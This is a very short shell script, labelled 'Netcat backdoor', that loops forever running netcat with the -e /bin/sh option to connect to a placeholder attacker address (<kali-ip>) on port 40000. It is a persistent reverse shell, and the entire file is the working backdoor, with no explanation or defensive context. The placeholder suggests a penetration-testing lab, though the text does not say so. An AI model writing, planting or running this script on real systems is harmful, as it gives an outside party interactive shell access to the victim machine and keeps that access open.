#! /bin/sh

echo "Netcat backdoor"

while true; do
	netcat <kali-ip> 40000 -e /bin/sh
done
